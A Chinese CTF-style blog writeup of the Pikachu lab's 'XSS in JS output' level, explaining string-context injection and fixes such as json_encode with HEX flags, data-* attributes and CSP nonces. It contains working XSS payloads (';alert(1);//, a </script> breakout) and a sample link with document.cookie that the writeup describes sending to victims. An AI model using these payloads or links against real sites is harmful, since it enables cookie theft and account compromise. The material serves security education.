---
layout: post
title: Pikachu - XSS之js输出 Writeup（四种上下文收官）
platform: pikachu
date: 2026-10-27 21:57:00 +0800
categories: CTF
---

Pikachu - XSS之js输出 Writeup（四种上下文收官）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：Cross-Site Scripting → xss之js输出
- 地址：`http://localhost/pikachu/vul/xss/xss_04.php`
- 题型：Web
- 考点：**JS 字符串上下文**、`</script>` 提前闭合、`json_encode` 的正确用法

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
pikachu 源码放在 D:\phpstudy_pro\WWW\pikachu\
```

**页面形态**：

```text
which NBA player do you like?

[                    ]  [submit]

无论如何不要放弃心中所爱..      ← 由 JS 动态写入
```

**作者的提示**：

```html
data-content="输入被动态的生成到了javascript中,如何是好。输入tmac试试-_-"
```

**✅ 实测结果（4 种输入）**

| 输入 | 生成的 JS | 结果 |
|---|---|---|
| `库里` | `$ms='库里';` | 正常显示 |
| `tmac` | `$ms='tmac';` | 彩蛋（显示"tmac确实厉害"）|
| **`';alert(1);//`** | **`$ms='';alert(1);//';`** | **弹窗 ✅（字符串闭合）** |
| `</script><script>alert(1)</script>` | `$ms='</script><script>...'` | **弹窗 ✅（script 标签提前闭合）** |

二、题目分析

**① 后端代码（零处理）**

```php
<?php
// xss_04.php 第 32-38 行
if(isset($_GET['submit']) && $_GET['message'] != null){
    $jsvar = $_GET['message'];        // ★ 直接取，一点处理都没有
//  $jsvar = htmlspecialchars($_GET['message'], ENT_QUOTES);   // 作者注释掉的尝试

    if($jsvar == 'tmac'){
        $html .= "<img src='...tmac.jpeg' />";
    }
}
?>
```

**② 前端代码（注入点）**

```html
<!-- xss_04.php 第 80-93 行 -->
<script>
    $ms='<?php echo $jsvar;?>';        <!-- ★ 注入点：单引号字符串里 -->
    if($ms.length != 0){
        if($ms == 'tmac'){
            $('#fromjs').text('tmac确实厉害,看那小眼神..')
        }else {
            $('#fromjs').text('无论如何不要放弃心中所爱..')
        }
    }
</script>
```

**★ 输出位置**：

```javascript
$ms='{用户输入}';
     └┬┘
   单引号包裹的 JS 字符串
```

**★ 这是第四种上下文**：

```
第 1 种：HTML 文本        <p>{$x}</p>
第 2 种：HTML 属性        <a href='{$x}'>
第 3 种：URL 属性         <a href="{$x}">  （防协议）
第 4 种：JS 字符串        <script>var x='{$x}'</script>   ← ★ 本关
```

**③ 作者把完整方法论写在注释里了**

```php
// xss_04.php 第 24-29 行（原文）
//这里讲输入动态的生成到了js中,形成xss
//javascript里面是不会对tag和字符实体进行解释的,所以需要进行js转义
//讲这个例子主要是为了让你明白,输出点在js中的xss问题,应该怎么修?
//这里如果进行html的实体编码,虽然可以解决XSS的问题,但是实体编码后的内容,在JS里面不会进行翻译,这样会导致前端的功能无法使用。
//所以在JS的输出点应该使用\对特殊字符进行转义
```

**★ 翻译成三层意思**：

```
① JS 不解释 HTML 标签和 HTML 实体
   → JS 上下文需要"JS 转义"，不是 HTML 转义

② 用 htmlspecialchars（HTML 实体编码）
   → XSS 确实没了
   → 但用户输入的单引号会显示成 &#039;
   → 功能被破坏

③ 所以 JS 输出点应该用 \ 转义特殊字符
   → ' → \'   " → \"   \ → \\   换行 → \n
```

**★ 这段注释是整个 XSS 模块最好的总结。**

**④ payload 1：闭合字符串**

**输入**：

```
';alert(1);//
```

**拼接后**：

```javascript
$ms='';alert(1);//';
```

**逐段拆解**：

```javascript
$ms=''          ← ① 字符串被闭合，$ms = 空字符串
;               ← ② 语句结束
alert(1)        ← ③ ★ 注入的代码执行
;               ← ④ 语句结束
//';            ← ⑤ ★ 把残留的 ' 和 ; 注释掉
```

**★ 第 ⑤ 步的 `//` 是关键**：

```
如果 payload 只写 ';alert(1);
→ 拼接结果：$ms='';alert(1);';
                                    ↑
                          这里有个孤立的 '，语法错误

→ 整个 <script> 块解析失败
→ alert 也不会执行
→ 攻击失败

★ 所以必须用 // 把尾巴注释掉
★ 或者用 /* 开头、*/ 结尾的多行注释
```

**⑤ payload 2：闭合 `</script>` 标签**

**输入**：

```
</script><script>alert(1)</script>
```

**拼接后**：

```html
<script>
    $ms='</script><script>alert(1)</script>';    ← ★ 这里就结束了
    ...（剩下的代码变成了纯文本，被浏览器丢弃）
</script>
```

**★ 为什么能打？**

```
HTML 解析器的 <script> 是"原始文本元素"（raw text element）：

    规则：从 <script> 开始，一直读到第一个 </script> 为止
    中间内容【不当 HTML 解析】，全部交给 JS 引擎
    
★ 所以 </script> 这个字面序列会【提前结束】整个 script 块
★ 攻击者注入的内容就跑到了 script 块外面 → 被当 HTML 解析
★ 于是新的 <script>alert(1)</script> 被执行
```

**★ 一个反直觉的点**：

```
在 <script> 内部，HTML 实体【不会被解码】

    输入 &lt;script&gt;
    → 在 JS 里就是字面的 7 个字符 "&lt;sc..."
    → 不会变成 <script>

★ 所以 "HTML 实体编码" 和 "原始文本模式" 是两套机制
```

**⑥ 为什么 htmlspecialchars 在这里是"用错药"**

**实测对比（用 PHP 7.3.4 直接跑）**：

```php
$p = "';alert(1);//";

// 1) 不处理
$ms='';alert(1);//';                    ← XSS

// 2) htmlspecialchars(ENT_QUOTES)
$ms='&#039;;alert(1);//';               ← 字符串闭合失败（安全）
                                             但用户看到 &#039; （功能坏）

// 3) json_encode（默认）
var ms="';alert(1);\/\/";                ← 安全，且显示正常
```

**再看输入 `I'm Kobe`（正常内容）**：

```php
// htmlspecialchars(ENT_QUOTES)
$ms='I&#039;m Kobe';                     ← ★ 页面显示 "I&#039;m Kobe"（乱码）

// json_encode
var ms="I'm Kobe";                       ← 正常显示 "I'm Kobe"
```

**★ 这就是作者说的"实体编码后的内容，在 JS 里面不会进行翻译，会导致前端功能无法使用"。**

**★ 结论**：

```
htmlspecialchars 在 JS 上下文里：
    ✅ 能防 XSS（因为 ' 变成了 &#039;，闭合不了）
    ❌ 破坏功能（用户看到 &#039; 而不是 '）
    
★ 它是"能防但用错"的方案
★ 正确答案是 json_encode
```

三、解题步骤

**第 1 步：打开页面，先看正常功能**

```text
http://localhost/pikachu/vul/xss/xss_04.php
```

**输入**：`库里`

**点 submit**

**页面显示**：

```text
which NBA player do you like?

无论如何不要放弃心中所爱..
```

**★ 注意：这句话不是 PHP 输出的，是 JS 用 `$('#fromjs').text(...)` 写进去的。**

**第 2 步：看彩蛋**

**输入**：`tmac`

**页面显示**：

```text
tmac确实厉害,看那小眼神..

+ 一张 tmac 的图片（PHP 输出的 <img>）
```

**★ 这里有两个输出点**：

```
① PHP 输出 <img> 标签（HTML 上下文）
② JS 输出文字（JS 上下文）
```

**第 3 步：⭐ 测试字符串闭合**

**输入框里填**：

```
';alert(1);//
```

**点 submit**

**结果**：**立刻弹窗 `1`** ✅

**★ 不用点击 —— 因为 `<script>` 在页面加载时就执行了。**

**第 4 步：看 DOM**

```text
① F12 → 【元素】
② Ctrl+F 搜 "$ms="
③ 看到：

   $ms='';alert(1);//';
       └┬┘└──┬───┘└┬┘
       闭合  执行   注释
```

**第 5 步：测试 `</script>` 闭合**

**输入**：

```
</script><script>alert(1)</script>
```

**结果**：**也弹窗** ✅

**★ 这条的更"暴力"，因为它不依赖字符串闭合，直接结束 script 块。**

**第 6 步：验证 HTML 实体在 script 里不解码**

**输入**：

```
&lt;script&gt;alert(1)&lt;/script&gt;
```

**★ 页面显示的是这串字面文本（因为 `$('#fromjs').text()` 会把它当纯文本）**

**★ 但如果你想验证"实体在 script 里不解码"，看 F12 元素**：

```html
<script>
    $ms='&lt;script&gt;alert(1)&lt;/script&gt;';
    ← 原样写着，JS 拿到的就是这串字符
    ← 不会变成 <script>
    ← 所以不会执行
</script>
```

**★ 这说明**：

```
在 <script> 里：
    &lt; 就是 4 个字符 & l t ;
    不是 <
    
★ 所以"HTML 实体编码"在 JS 字符串里既不能防 XSS（对 </script> 无用）
                                    也破坏功能（显示乱码）
```

**第 7 步：完整的攻击场景**

**构造恶意链接**：

```
http://靶场/pikachu/vul/xss/xss_04.php?message=%27%3Balert(document.cookie)%3B%2F%2F&submit=submit
```

**发给受害者**：

```
"你最爱的 NBA 球员是谁？做个测试：
 http://靶场/.../xss_04.php?message=..."

受害者：
    ① 点开链接
    ② 页面加载 → <script> 执行 → 弹窗
    ③ 完全不需要点击页面上的任何东西
```

**★ 这就是"反射型 + JS 上下文"的组合。**

四、延伸知识

**① ⭐ 四种上下文的完整地图（XSS 模块收官）**

| 上下文 | 典型代码 | 危险字符/值 | 正确防御 | 对应关卡 |
|---|---|---|---|---|
| **HTML 文本** | `<p>{$x}</p>` | `< >` | `htmlspecialchars($x, ENT_QUOTES)` | 反射型/存储型 |
| **HTML 属性** | `<a href='{$x}'>` | `' "` | `htmlspecialchars($x, ENT_QUOTES)` | htmlspecialchars 那关 |
| **URL 属性** | `<a href="{$x}">` | `javascript:` `data:` | **协议白名单** + 转义 | href 输出那关 |
| **JS 字符串** | `<script>var x='{$x}'</script>` | `' " \ </script>` | **`json_encode` + HEX 标志** | **本关** |
| **DOM（JS 操作）** | `el.innerHTML = x` | `<img onerror>` | `textContent` / DOMPurify | DOM 型两关 |
| **CSS** | `style="color:{$x}"` | `expression()` `url()` | 白名单（只允许颜色值格式）| — |

**★ 核心原则**：

```
"转义"不是一个通用操作
每个上下文有自己的危险字符集

★ 用错上下文 = 有漏洞 或 破坏功能
```

**② `json_encode` 的四个 HEX 标志（关键）**

**PHP 的 `json_encode` 默认行为**：

```php
json_encode("</script>")     // → "\"<\\/script>\""     ← 斜杠被转成 \/
json_encode("'")             // → "\"'\""               ← 单引号原样！
json_encode('"')             // → "\"\\\"\""            ← 双引号转义
json_encode("库里")           // → "\"\\u5e93\\u91cc\""   ← 中文转 \u 转义
```

**★ 四个标志的作用**：

| 标志 | 作用 | 防什么 |
|---|---|---|
| `JSON_HEX_TAG` | `<` `>` → `\u003C` `\u003E` | **`</script>` 提前闭合** |
| `JSON_HEX_AMP` | `&` → `\u0026` | HTML 实体注入 |
| `JSON_HEX_APOS` | `'` → `\u0027` | 单引号闭合（如果用双引号包裹则不需要）|
| `JSON_HEX_QUOT` | `"` → `\u0022` | 双引号闭合（如果用单引号包裹则不需要）|

**★ `JSON_HEX_TAG` 是最关键的**：

```php
json_encode("</script>")                                    // "\"<\\/script>\""        ← 靠默认的斜杠转义碰巧安全
json_encode("</script>", JSON_UNESCAPED_SLASHES)            // "\"</script>\""         ← ★ 危险！会闭合
json_encode("</script>", JSON_HEX_TAG)                      // "\"\\u003C\\/script\\u003E\""  ← ✅ 安全
```

**★ 所以推荐写法**：

```php
<?php
$json = json_encode($jsvar, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);
?>
<script>
    var ms = <?= $json ?>;
</script>
```

**★ 注意不要传 `JSON_UNESCAPED_SLASHES`**：

```
它会让 / 不被转义 → </script> 变成字面的 </script>
→ 提前闭合 script 块
→ XSS

★ 这个参数是为了"让 JSON 更好看"，但会引入安全风险
★ 在 HTML 里嵌 JSON 时绝对不能加
```

**③ `<script>` 是"原始文本元素"（raw text element）**

**HTML 规范定义了两种特殊元素**：

| 类型 | 元素 | 特性 |
|---|---|---|
| **原始文本（Raw text）** | `<script>`、`<style>` | 内容不解析 HTML 实体，遇到对应结束标签才结束 |
| **可转义原始文本（Escapable raw text）** | `<textarea>`、`<title>` | 不解析标签，但解析 HTML 实体 |
| **普通元素** | `<div>`、`<p>` | 正常解析 |

**★ 这意味着**：

```html
<script>
    var x = "&lt;";      // x 就是字符串 "&lt;"（4 个字符）
    var y = "<";         // 但这是语法错误（未闭合的字符串）...
</script>

<textarea>
    &lt;script&gt;       // → 显示成 <script>（实体被解码了）
</textarea>
```

**★ 所以 `</script>` 是唯一的"结束标记"**：

```javascript
var x = "abc";// </script> 会在这里闭合
```

**★ 补充：即使 `</script>` 在字符串里也会闭合**：

```html
<script>
    var x = "</script>";     // ← 浏览器在这里就结束 script 了
                               // 后面的 " 变成了 HTML 文本
</script>
```

**★ 这就是为什么 `JSON_HEX_TAG` 必须加。**

**④ JS 上下文的三种正确写法**

**写法 1：`json_encode`（推荐，最简单）**

```php
<script>
    var data = <?= json_encode($input, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT) ?>;
</script>
```

**写法 2：放在 `data-*` 属性里（更安全的设计）**

```html
<div id="app" data-name="<?= htmlspecialchars($input, ENT_QUOTES, 'UTF-8') ?>"></div>
<script>
    var name = document.getElementById('app').dataset.name;
    // ★ 这里拿到的已经是"纯文本"，不会被当 JS 解析
</script>
```

**★ 这个模式很推荐**：

```
把数据放在 data-* 属性里（用 HTML 属性转义）
再用 JS 读出来（天然是字符串，不需要额外转义）

★ 这就是"HTML 转义 + 数据属性"的经典组合
```

**写法 3：单独请求 JSON 接口（前后端分离的标准做法）**

```javascript
fetch('/api/user')
    .then(r => r.json())
    .then(data => {
        document.getElementById('name').textContent = data.name;   // ★ textContent
    });
```

**★ 优点**：

```
HTML 里根本没有内嵌数据
→ JS 上下文不存在
→ 从架构上消除了这类漏洞
```

**⑤ `textContent` vs `innerHTML`（DOM 上下文）**

**复习 DOM 型两关学过的**：

```javascript
// ❌ 危险
el.innerHTML = userInput;

// ✅ 安全
el.textContent = userInput;
```

**★ 为什么 `textContent` 安全**：

```
它把输入当"纯文本"处理
不管里面有什么 < > ' " <img onerror>
都只是文字，不会被解析成 HTML

★ 浏览器不会为 textContent 创建任何标签或执行任何代码
```

**★ jQuery 的对应写法**：

```javascript
$('#el').text(userInput);    // ✅ 安全（等价 textContent）
$('#el').html(userInput);    // ❌ 危险（等价 innerHTML）
```

**★ 本关的代码用的是 `.text()`**：

```javascript
$('#fromjs').text('无论如何不要放弃心中所爱..')
```

**★ 所以"输出"这一步是安全的 —— 危险的是"输入被拼进 JS 源码"那一步（PHP 层）。**

**这个区分很重要**：

```
漏洞在 PHP 的 echo（拼进 JS 源码）
不在 JS 的 .text()（安全地写文本）
```

**⑥ CSP 的 nonce 方案（现代最佳实践）**

**如果页面必须内联 JS，用 nonce**：

```php
<?php $nonce = base64_encode(random_bytes(16)); ?>
<meta http-equiv="Content-Security-Policy"
      content="script-src 'nonce-<?= $nonce ?>' 'strict-dynamic'">

<script nonce="<?= $nonce ?>">
    // 只有带正确 nonce 的 <script> 会执行
</script>
```

**★ CSP nonce 的效果**：

```
攻击者注入的 <script>alert(1)</script>
→ 没有 nonce 属性
→ 浏览器拒绝执行 ✅

★ 但注意：非 script 的注入（<img onerror>）仍需要输出转义
★ 因为 CSP 主要限制"脚本来源"，不是"HTML 注入"
```

**⑦ XSS 模块 10 关的完整总结**

| # | 关卡 | 漏洞点 | 关键 payload | 核心认知 |
|---|---|---|---|---|
| 1 | xss_reflected_get | `$_GET['message']` 直接 echo | `<script>alert(1)</script>`（绕 maxlength）| 反射型 = 需社工 |
| 2 | xsspost | `$_POST['message']` 直接 echo | 自动提交表单 | POST 也需社工 + Pass-the-Hash |
| 3 | xss_stored | 输入 escape，输出不转义 | `<script>` 存库 | SQL 转义 ≠ HTML 转义 |
| 4 | xss_dom | `input.value → innerHTML` | `'><img onerror=>` | Source/Sink，Self-XSS |
| 5 | xss_dom_x | `location.search → innerHTML` | 恶意 URL | 源可控才真能打别人 |
| 6 | xssblind | 后台渲染留言 | `fetch` + 带外 | 打管理员，需 OOB 确认 |
| 7 | xss_01 | 正则黑名单 | `<SCRIPT>` / `<img onerror>` | 黑名单必败 |
| 8 | xss_02 | `htmlspecialchars` 默认 flags | `' onclick='` | ENT_COMPAT 不转单引号 |
| 9 | xss_03 | href 无协议校验 | `javascript:alert(1)` | URL 上下文要协议白名单 |
| 10 | **xss_04** | **JS 字符串拼接** | **`';alert(1);//`** | **JS 上下文要 json_encode** |

**★ 十个关卡覆盖了**：

```
类型：反射 / 存储 / DOM / 盲打
源：输入框 / URL / 数据库 / JS 变量
汇：echo / innerHTML / href / JS 字符串
防护：无 / 黑名单 / 转义（flags 错）/ 正确转义
确认：直接看 / 带外（OOB）
```

五、总结

- **本题核心：`$jsvar` 被直接拼进 `<script>` 里的单引号字符串，零处理 → 闭合字符串即可注入 JS。**

- **关键代码（PHP + JS）**：

```php
$jsvar = $_GET['message'];               // 零处理
```
```html
<script>
    $ms='<?php echo $jsvar;?>';          // 注入点
</script>
```

- **两个 payload**：

```javascript
';alert(1);//                            ← 闭合字符串（// 注释掉尾巴）
</script><script>alert(1)</script>       ← 闭合 script 标签
```

- **⭐ 五个必记要点**：

```text
① JS 上下文要"JS 转义"，不是 HTML 转义
   htmlspecialchars 能防但破坏功能（显示 &#039;）
   正确解：json_encode + JSON_HEX_TAG

② 必须注释掉尾巴
   ';alert(1);    → 语法错误，整个 script 不执行
   ';alert(1);//  → 正确

③ </script> 是唯一结束标记
   <script> 是"原始文本元素"，里面 HTML 实体不解码
   但 </script> 字面序列会提前闭合
   → 必须用 JSON_HEX_TAG 把 < 转成 \u003C

④ json_encode 不要加 JSON_UNESCAPED_SLASHES
   它会让 / 不被转义 → </script> 能闭合
   → XSS

⑤ 更好架构：把数据放 data-* 属性
   HTML 属性转义 + JS 读 dataset
   → 从架构上消除"JS 上下文"
```

- **实测数据**：

```text
库里                          → $ms='库里';                正常
tmac                          → $ms='tmac';                彩蛋
';alert(1);//                 → $ms='';alert(1);//';        ✅ 弹窗
</script><script>alert(1)...  → script 提前闭合              ✅ 弹窗

PHP 7.3.4 直接验证（输入 ';alert(1);//）：
    无处理:                  $ms='';alert(1);//';            ← XSS
    htmlspecialchars:        $ms='&#039;;alert(1);//';       ← 安全但显示乱码
    json_encode:             var ms="';alert(1);\/\/";       ← 安全且显示正常
    json_encode + HEX 标志:   var ms="\u0027;alert(1);\/\/";  ← 最安全

正常内容 "I'm Kobe"：
    htmlspecialchars:        $ms='I&#039;m Kobe';            ← ★ 显示成乱码
    json_encode:             var ms="I'm Kobe";              ← 正常
```

- **XSS 模块进度**：**全部完成 🎉 10/10**

```text
✅ 反射型xss(get)         —— 直接拼接，需绕 maxlength
✅ 反射型xss(post)        —— 需登录 + 自动提交表单 + Pass-the-Hash
✅ 存储型xss              —— SQL 转义≠HTML 转义
✅ DOM型xss               —— 源=input（Self-XSS）
✅ DOM型xss-x             —— 源=URL（真可利用）
✅ xss之盲打              —— 打管理员 + 带外确认
✅ xss之过滤              —— 黑名单绕过
✅ xss之htmlspecialchars  —— 默认 flags 的坑
✅ xss之href输出           —— 协议没校验
✅ xss之js输出             —— 本题：JS 字符串上下文
```

**手工复现要点**：

```text
· 打开 xss_04.php，输入"库里" → 看 JS 写的文案
· 输入 tmac → 看彩蛋
· 输入 ';alert(1);// → 弹窗（不用点击）
· F12 元素搜 $ms= → 看拼接结果
· 输入 </script><script>alert(1)</script> → 也弹窗
· 输入 &lt;script&gt; → 不弹（实体在 script 里不解码）
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  JS 上下文是"第四种上下文"，它有四个危险字符：                  │
│      '  "  \  /  以及 </script> 这个序列                     │
│                                                            │
│  HTML 转义在这里是"用错药"：                                  │
│      能防 XSS，但用户看到 &#039; 而不是 '                      │
│                                                            │
│  正确解：                                                    │
│      json_encode($x, JSON_HEX_TAG | JSON_HEX_AMP |          │
│                     JSON_HEX_APOS | JSON_HEX_QUOT)         │
│                                                            │
│  ★ 千万不要加 JSON_UNESCAPED_SLASHES（会让 </script> 生效）    │
│  ★ 更好的架构：数据放 data-* 属性，JS 用 dataset 读           │
└────────────────────────────────────────────────────────────┘
```

**★ 至此 XSS 模块 10 关全部完成。**
**★ 四种上下文（HTML 文本 / HTML 属性 / URL / JS）全部走了一遍。**
**★ 从"无防护"到"黑名单"到"转义用错"到"正确转义"，防护的演进也走了一遍。**
